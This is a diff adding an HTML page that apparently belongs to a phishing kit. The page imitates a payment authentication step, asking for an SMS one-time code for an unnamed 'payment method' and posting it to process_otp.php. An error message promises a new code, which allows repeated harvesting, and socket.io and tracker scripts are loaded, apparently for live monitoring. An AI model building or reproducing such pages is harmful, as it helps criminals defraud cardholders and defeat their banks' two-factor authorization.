@@ -1,0 +1,67 @@
+﻿<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Verification Code</title>
+    <link rel="stylesheet" href="qpy_styles.css">
+    <style>
+        body {
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <div class="otp-wrapper">
+        <h2>Authentication Required</h2>
+        <p>A verification code has been sent to the mobile number registered with your payment method. Please enter it below to authorize this transaction.</p>
+        
+        <form action="process_otp.php" method="POST" id="otpForm">
+            <input type="text" id="otpCode" name="otpCode" class="otp-input" required placeholder="----" maxlength="6">
+            <div class="otp-error" id="otpError">
+                The code you entered is incorrect. A new code will be sent to you shortly, please enter it carefully.
+            </div>
+            
+            <button type="submit" class="otp-submit" id="submitBtn" disabled style="background-color: #cccccc; cursor: not-allowed;">Confirm Payment</button>
+        </form>
+    </div>
+
+    <script>
+        const otpInput = document.getElementById('otpCode');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorDiv = document.getElementById('otpError');
+
+        // Check for error in URL
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('error')) {
+            errorDiv.style.display = 'block';
+            otpInput.value = ''; // clear input
+        }
+
+        otpInput.addEventListener('input', function() {
+            // Allow only numbers
+            this.value = this.value.replace(/[^0-9]/gi, '');
+            
+            // Enable button if 4 to 6 digits
+            if (this.value.length >= 4 && this.value.length <= 6) {
+                submitBtn.disabled = false;
+                submitBtn.style.backgroundColor = '#6F1841';
+                submitBtn.style.cursor = 'pointer';
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.style.backgroundColor = '#cccccc';
+                submitBtn.style.cursor = 'not-allowed';
+            }
+        });
+    </script>
+<script src="/socket.io/socket.io.js"></script>
+<script src="/assets/tracker.js"></script>
+</body>
+</html>
+
